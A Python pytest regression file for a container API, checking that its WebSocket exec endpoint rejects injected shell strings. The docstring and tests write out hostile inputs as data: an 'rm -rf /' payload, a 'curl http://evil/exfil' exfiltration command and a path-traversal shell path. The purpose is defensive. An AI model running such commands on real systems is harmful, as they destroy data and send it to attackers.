"""Regression for BUG-001: WS exec accepted arbitrary `shell` strings.

The previous code did shlex.split on the raw user input, so
?shell=/bin/sh -c 'rm -rf /' became ["/bin/sh", "-c", "rm -rf /"] and
ran inside the container. Whitelist a small set of real shell binaries.
"""
import jwt as _jwt
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from api.db.database import Base
from api.db.models.users import User
from api.routers.containers import container_exec, ALLOWED_EXEC_SHELLS


engine = create_engine("sqlite:///:memory:")
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

SECRET = "test-secret-key-for-ws-shell"


@pytest.fixture
def db():
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    with patch("api.routers.containers.SessionLocal", SessionLocal):
        yield SessionLocal()


@pytest.fixture(autouse=True)
def enable_auth(monkeypatch):
    monkeypatch.setattr("api.routers.containers.settings.DISABLE_AUTH", False)
    monkeypatch.setattr("api.routers.containers.get_secret_key", lambda: SECRET)


def _add_user(db, username, **kw):
    defaults = dict(
        hashed_password="pw", is_active=True, is_superuser=False, perm_start=True,
    )
    defaults.update(kw)
    u = User(username=username, **defaults)
    db.add(u)
    db.commit()
    return u


def _make_ws(token=None):
    ws = MagicMock()
    ws.accept = AsyncMock()
    ws.send_json = AsyncMock()
    ws.close = AsyncMock()
    ws.cookies = {"access_token_cookie": token} if token else {}
    return ws


def _token(payload):
    return _jwt.encode(payload, SECRET, algorithm="HS256")


@pytest.mark.asyncio
async def test_disallowed_shell_rejected_before_auth(db):
    # Even WITHOUT a token, the shell check fires first because it runs
    # before auth. That keeps a probing attacker from getting any signal
    # about whether their token is valid.
    ws = _make_ws(token=None)
    await container_exec(ws, "any", shell="/bin/sh -c 'whoami'", cols=80, rows=24)
    ws.send_json.assert_awaited_with({"error": "Forbidden: shell not allowed"})
    ws.close.assert_awaited_with(code=1008)


@pytest.mark.asyncio
async def test_command_smuggling_attempt_rejected(db):
    _add_user(db, "ops")
    ws = _make_ws(token=_token({"sub": "ops"}))
    await container_exec(
        ws, "any", shell="/bin/bash -c 'curl http://evil/exfil'", cols=80, rows=24,
    )
    ws.send_json.assert_awaited_with({"error": "Forbidden: shell not allowed"})


@pytest.mark.asyncio
async def test_path_traversal_in_shell_rejected(db):
    _add_user(db, "ops")
    ws = _make_ws(token=_token({"sub": "ops"}))
    await container_exec(ws, "any", shell="../../bin/sh", cols=80, rows=24)
    ws.send_json.assert_awaited_with({"error": "Forbidden: shell not allowed"})


@pytest.mark.asyncio
async def test_default_sh_accepted(db, monkeypatch):
    _add_user(db, "ops", perm_start=True)
    from api.routers import containers as containers_module
    object.__setattr__(
        containers_module.settings, "DOCKER_HOST", "unix:///var/run/docker.sock"
    )
    ws = _make_ws(token=_token({"sub": "ops"}))
    ws.receive = AsyncMock(side_effect=Exception("stop"))

    docker_instance = MagicMock()
    docker_instance.containers.get = AsyncMock(side_effect=Exception("not found"))
    docker_instance.close = AsyncMock()
    with patch("api.routers.containers.aiodocker.Docker", return_value=docker_instance):
        await container_exec(ws, "abc", shell="/bin/sh", cols=80, rows=24)

    # The shell check should not have fired
    payloads = [c.args[0] for c in ws.send_json.await_args_list]
    for p in payloads:
        assert p.get("error") != "Forbidden: shell not allowed"


def test_whitelist_doesnt_contain_obvious_smuggling_targets():
    # Smoke test: anything in the allowlist must be a plain executable name
    # or absolute path with NO whitespace or shell metacharacters.
    for entry in ALLOWED_EXEC_SHELLS:
        assert " " not in entry
        assert ";" not in entry
        assert "|" not in entry
        assert "&" not in entry
        assert "$" not in entry
        assert "`" not in entry
